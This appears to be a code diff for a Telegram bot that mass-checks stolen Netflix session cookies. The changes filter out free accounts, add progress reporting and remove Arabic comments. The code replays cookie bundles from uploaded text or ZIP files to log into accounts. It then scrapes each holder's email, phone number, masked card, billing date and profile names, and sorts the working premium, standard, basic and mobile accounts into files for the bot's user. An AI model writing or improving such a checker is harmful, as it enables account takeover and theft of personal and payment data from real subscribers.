@@ -283,7 +283,6 @@ def get_full_country_name(country_code):
     return countries.get(country_code.upper(), country_code)
 
 def clean_profile_names(profiles_raw):
-    """تنقية أسماء البروفايلات مع ضمان وجود اسم واحد على الأقل"""
     if not profiles_raw:
         return [], 0
     
@@ -329,7 +328,6 @@ def clean_profile_names(profiles_raw):
             
         clean_names.append(name)
     
-    # إذا لم نجد أي اسم، نأخذ أول اسم من القائمة الأصلية
     if not clean_names and names_list:
         first_name = clean_text(names_list[0])
         if first_name and len(first_name) >= 2:
@@ -338,14 +336,12 @@ def clean_profile_names(profiles_raw):
     return clean_names, len(clean_names)
 
 def get_name_from_profiles(info):
-    """استخراج الاسم من أول بروفايل حقيقي"""
     profiles_raw = info.get("profiles") or ""
     if profiles_raw:
         clean_names, _ = clean_profile_names(profiles_raw)
         if clean_names:
             return clean_names[0]
         
-        # محاولة أخيرة: أول اسم في القائمة
         names = [p.strip() for p in profiles_raw.split(",") if p.strip()]
         if names:
             return clean_text(names[0])
@@ -371,7 +367,6 @@ def extract_payment_method_strong(html_content, info):
     return "Credit Card"
 
 def extract_profile_names_enhanced(response_text):
-    """استخراج أسماء البروفايلات من HTML بأنماط متعددة"""
     names = []
     patterns = [
         r'"profileName"\s*:\s*"([^"]+)"',
@@ -394,7 +389,6 @@ def extract_profile_names_enhanced(response_text):
                 if name and name not in names and len(name) < 50:
                     names.append(name)
     
-    # فلترة الأسماء الممنوعة
     forbidden = ['chrome', 'firefox', 'safari', 'edge', 'opera', 'android', 'ios', 'windows', 'mac', 'linux']
     filtered = [n for n in names if n.lower() not in forbidden]
     
@@ -680,28 +674,16 @@ def get_language_from_html(html_content):
     return "English"
 
 def extract_all_account_details(html_content, info_dict):
-    """دالة قوية لاستخراج كل البيانات الناقصة من HTML"""
-    
-    # استخراج الإيميل
     if not info_dict.get('email') or info_dict.get('email') == "Unknown":
-        email_patterns = [
-            r'"email"\s*:\s*"([^"]+@[^"]+)"',
-            r'"loginId"\s*:\s*"([^"]+@[^"]+)"',
-            r'"emailAddress"\s*:\s*"([^"]+@[^"]+)"',
-        ]
+        email_patterns = [r'"email"\s*:\s*"([^"]+@[^"]+)"', r'"loginId"\s*:\s*"([^"]+@[^"]+)"', r'"emailAddress"\s*:\s*"([^"]+@[^"]+)"']
         for pattern in email_patterns:
             match = re.search(pattern, html_content, re.IGNORECASE)
             if match:
                 info_dict['email'] = clean_text(match.group(1))
                 break
     
-    # استخراج السعر
     if not info_dict.get('planPrice') or info_dict.get('planPrice') == "N/A":
-        price_patterns = [
-            r'"planPrice"\s*:\s*"([^"]+)"',
-            r'"priceDisplay"\s*:\s*"([^"]+)"',
-            r'"formattedPrice"\s*:\s*"([^"]+)"',
-        ]
+        price_patterns = [r'"planPrice"\s*:\s*"([^"]+)"', r'"priceDisplay"\s*:\s*"([^"]+)"', r'"formattedPrice"\s*:\s*"([^"]+)"']
         for pattern in price_patterns:
             match = re.search(pattern, html_content, re.IGNORECASE)
             if match:
@@ -710,24 +692,16 @@ def extract_all_account_details(html_content, info_dict):
                     info_dict['planPrice'] = price
                     break
     
-    # استخراج تاريخ الفاتورة القادمة
     if not info_dict.get('nextBillingDate') or info_dict.get('nextBillingDate') == "Unknown":
-        billing_patterns = [
-            r'"nextBillingDate"\s*:\s*"([^"]+)"',
-            r'"billingDate"\s*:\s*"([^"]+)"',
-        ]
+        billing_patterns = [r'"nextBillingDate"\s*:\s*"([^"]+)"', r'"billingDate"\s*:\s*"([^"]+)"']
         for pattern in billing_patterns:
             match = re.search(pattern, html_content, re.IGNORECASE)
             if match:
                 info_dict['nextBillingDate'] = clean_text(match.group(1))
                 break
     
-    # استخراج رقم الهاتف
     if not info_dict.get('phoneNumber') or info_dict.get('phoneNumber') == "N/A":
-        phone_patterns = [
-            r'"phoneNumber"\s*:\s*"([^"]+)"',
-            r'"rawPhoneNumber"\s*:\s*"([^"]+)"',
-        ]
+        phone_patterns = [r'"phoneNumber"\s*:\s*"([^"]+)"', r'"rawPhoneNumber"\s*:\s*"([^"]+)"']
         for pattern in phone_patterns:
             match = re.search(pattern, html_content, re.IGNORECASE)
             if match:
@@ -736,13 +710,8 @@ def extract_all_account_details(html_content, info_dict):
                     info_dict['phoneNumber'] = phone
                     break
     
-    # استخراج تفاصيل الكارت
     if not info_dict.get('maskedCard') or info_dict.get('maskedCard') == "N/A":
-        card_patterns = [
-            r'"maskedCard"\s*:\s*"([^"]+)"',
-            r'"cardNumber"\s*:\s*"([^"]+)"',
-            r'"lastFour"\s*:\s*"([^"]+)"',
-        ]
+        card_patterns = [r'"maskedCard"\s*:\s*"([^"]+)"', r'"cardNumber"\s*:\s*"([^"]+)"', r'"lastFour"\s*:\s*"([^"]+)"']
         for pattern in card_patterns:
             match = re.search(pattern, html_content, re.IGNORECASE)
             if match:
@@ -807,7 +776,6 @@ def format_result_beautiful(info, is_subscribed, cookie_content, cookie_filename
     if config is None:
         config = load_config()
     
-    # استخراج البيانات الناقصة من HTML
     info = extract_all_account_details(html_content, info)
     
     plan_key, plan_label = derive_plan_info(info, is_subscribed)
@@ -943,7 +911,6 @@ def format_progress_message(processed, total, valid_count, premium_count, free_c
 
 Total Cookies: {total}
 Mode: Fullinfo
-Filter: Premium accounts only
 
 📊 Current Status:
 {percentage:.1f}% {bar}
@@ -1019,7 +986,6 @@ STEP 3: Get Results
    - STANDARD_ACCOUNTS.txt (Standard plans)
    - BASIC_ACCOUNTS.txt (Basic plans)
    - MOBILE_ACCOUNTS.txt (Mobile plans)
-   - FREE_ACCOUNTS.txt (Free accounts)
    - PARTIAL_DATA.txt (Limited data)
 
 🔽 USE THE MENU BUTTON FOR COMMANDS
@@ -1104,12 +1070,13 @@ Membership: {partial_info.get('membershipStatus', 'Unknown')}
             return None, None, f"HTTP {status_code}"
 
 
-# ==================== SEND RESULTS WITH SPLITTING (30 حساب لكل ملف) ====================
+# ==================== SEND RESULTS (بدون FREE) ====================
 
-async def send_large_results(update, results_by_plan, max_per_file=30):
-    """إرسال النتائج بعد تقسيمها إلى ملفات متعددة - كل 30 حساب في ملف"""
-    for plan, results in results_by_plan.items():
-        if not results or plan == "partial":
+async def send_results(update, results_by_plan, max_per_file=30):
+    """إرسال النتائج - فقط Premium, Standard, Basic, Mobile (بدون FREE)"""
+    for plan in ["premium", "standard", "basic", "mobile"]:
+        results = results_by_plan.get(plan, [])
+        if not results:
             continue
         
         total_accounts = len(results) // 2
@@ -1221,8 +1188,7 @@ async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE)
                 results_by_plan[target_key].append("")
                 stats['valid'] += 1
             elif result_type == "free":
-                results_by_plan["free"].append(result)
-                results_by_plan["free"].append("")
+                # لا نضيف الحسابات FREE إلى النتائج (نتجاهلها تماماً)
                 stats['free'] += 1
             elif result_type == "partial":
                 results_by_plan["partial"].append(result)
@@ -1249,7 +1215,6 @@ Premium Accounts: {len(results_by_plan['premium']) // 2}
 Standard Accounts: {len(results_by_plan['standard']) // 2}
 Basic Accounts: {len(results_by_plan['basic']) // 2}
 Mobile Accounts: {len(results_by_plan['mobile']) // 2}
-Free Accounts: {len(results_by_plan['free']) // 2}
 Partial Data: {len(results_by_plan['partial']) // 2}
 Invalid Accounts: {invalid_count}
 
@@ -1260,8 +1225,8 @@ Speed: {spd:.2f} accounts/second
         await status_msg.delete()
         await update.message.reply_text(final)
         
-        # إرسال الملفات بالتقسيم (كل 30 حساب في ملف)
-        await send_large_results(update, results_by_plan, max_per_file=30)
+        # إرسال الملفات (Premium, Standard, Basic, Mobile فقط)
+        await send_results(update, results_by_plan, max_per_file=30)
         
         if results_by_plan["partial"]:
             all_partial = "".join(results_by_plan["partial"])
@@ -1288,7 +1253,7 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_tasks[uid]['active'] = False
         return
     
-    msg = await update.message.reply_text(f"📦 Processing ZIP: {fname}\n\nPlease wait...")
+    msg = await update.message.reply_text(f"📥 Processing ZIP: {fname}\n\n{format_progress_message(0, 0, 0, 0, 0, 0, 0, 0)}")
     file = await doc.get_file()
     zip_data = BytesIO()
     await file.download_to_memory(zip_data)
@@ -1298,20 +1263,32 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
     
     invalid_count = 0
-    total_files = 0
-    processed = 0
+    total_cookies = 0
+    processed_cookies = 0
+    premium_count = 0
+    free_count = 0
     
     try:
         with zipfile.ZipFile(zip_data, 'r') as zf:
             files = [f for f in zf.namelist() if f.endswith(('.txt', '.json'))]
-            total_files = len(files)
             if not files:
                 await msg.edit_text("❌ No cookie files found in ZIP")
                 user_tasks[uid]['active'] = False
                 return
             
+            # حساب العدد الإجمالي للكوكيز أولاً
+            await msg.edit_text(f"📊 Scanning ZIP contents...")
+            for cf in files:
+                content = zf.read(cf).decode('utf-8', errors='ignore')
+                bundles = extract_netflix_cookie_bundles(content)
+                total_cookies += len(bundles)
+            
+            await msg.edit_text(f"📦 Found {total_cookies} total cookies in {len(files)} files.\nStarting check...")
+            
             config = load_config()
             mode = context.user_data.get('mode', 'fullinfo')
+            last_update_time = time.time()
+            update_interval = 1.0
             
             for cf in files:
                 if user_tasks[uid].get('cancel', False):
@@ -1322,12 +1299,22 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     content = zf.read(cf).decode('utf-8', errors='ignore')
                     bundles = extract_netflix_cookie_bundles(content)
                     
-                    if not bundles:
-                        invalid_count += 1
-                        processed += 1
-                        continue
-                    
                     for bundle in bundles:
+                        current_time = time.time()
+                        if current_time - last_update_time >= update_interval or processed_cookies == total_cookies:
+                            elapsed = time.time() - start
+                            speed = processed_cookies / elapsed if elapsed > 0 else 0
+                            remaining = total_cookies - processed_cookies
+                            eta = remaining / speed if speed > 0 else 0
+                            
+                            progress_msg = format_progress_message(
+                                processed_cookies, total_cookies,
+                                stats['valid'], premium_count, free_count,
+                                invalid_count, speed, eta
+                            )
+                            await msg.edit_text(progress_msg)
+                            last_update_time = current_time
+                        
                         cookies = bundle.get("cookies", {})
                         if has_required_netflix_cookies(cookies):
                             sess = requests.Session()
@@ -1351,11 +1338,11 @@ async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     results_by_plan[target_key].append(res)
                                     results_by_plan[target_key].append("")
                                     stats['valid'] += 1
+                                    premium_count += 1
                                 else:
-                                    res, plan_key = format_result_beautiful(info, is_sub, bundle.get("netscape_text", ""), cf, None, config, response_text)
-                                    results_by_plan["free"].append(res)
-                                    results_by_plan["free"].append("")
+                                    # تجاهل الحسابات FREE تماماً
                                     stats['free'] += 1
+                                    free_count += 1
                             else:
                                 partial_info = extract_info_fallback(response_text) if response_text else {}
                                 if partial_info and any(partial_info.get(f) for f in ["countryOfSignup", "membershipStatus", "localizedPlanName"]):
@@ -1371,8 +1358,12 @@ Membership: {partial_info.get('membershipStatus', 'Unknown')}
 """
                                     results_by_plan["partial"].append(partial_res)
                                     results_by_plan["partial"].append("")
-                                    stats['valid'] += 1 if is_sub else 0
-                                    stats['free'] += 1 if not is_sub else 0
+                                    if is_sub:
+                                        stats['valid'] += 1
+                                        premium_count += 1
+                                    else:
+                                        stats['free'] += 1
+                                        free_count += 1
                                 else:
                                     invalid_count += 1
                                     stats['failed'] += 1
@@ -1381,45 +1372,38 @@ Membership: {partial_info.get('membershipStatus', 'Unknown')}
                             stats['failed'] += 1
                         
                         stats['total'] += 1
-                    
-                    processed += 1
-                    
-                    if processed % 5 == 0:
-                        await msg.edit_text(f"📦 Processed {processed}/{total_files} files...")
+                        processed_cookies += 1
                     
                 except Exception as e:
-                    invalid_count += 1
-                    processed += 1
                     print(f"Error: {e}")
         
         if not user_tasks[uid].get('cancel', False):
             elapsed = time.time() - start
-            spd = total_files / elapsed if elapsed > 0 else 0
+            spd = total_cookies / elapsed if elapsed > 0 else 0
             
             final = f"""
 ✅ Processing Complete
 
 Final Statistics:
 ----------------------------------------------------
-Total Files: {total_files}
+Total Cookies: {total_cookies}
 
 Premium Accounts: {len(results_by_plan['premium']) // 2}
 Standard Accounts: {len(results_by_plan['standard']) // 2}
 Basic Accounts: {len(results_by_plan['basic']) // 2}
 Mobile Accounts: {len(results_by_plan['mobile']) // 2}
-Free Accounts: {len(results_by_plan['free']) // 2}
 Partial Data: {len(results_by_plan['partial']) // 2}
 Invalid Accounts: {invalid_count}
 
 Time Taken: {elapsed:.2f} seconds
-Speed: {spd:.2f} files/second
+Speed: {spd:.2f} accounts/second
 ----------------------------------------------------
 """
             await msg.delete()
             await update.message.reply_text(final)
             
-            # إرسال الملفات بالتقسيم (كل 30 حساب في ملف)
-            await send_large_results(update, results_by_plan, max_per_file=30)
+            # إرسال الملفات (Premium, Standard, Basic, Mobile فقط)
+            await send_results(update, results_by_plan, max_per_file=30)
             
             if results_by_plan["partial"]:
                 all_partial = "".join(results_by_plan["partial"])
@@ -1466,7 +1450,6 @@ def main():
     print("Bot is starting...")
     print("="*50)
     
-    # زيادة المهلة بشكل كبير عشان الملفات الكبيرة تتبعت من غير مشاكل
     request = HTTPXRequest(
         connect_timeout=90.0,
         read_timeout=300.0,
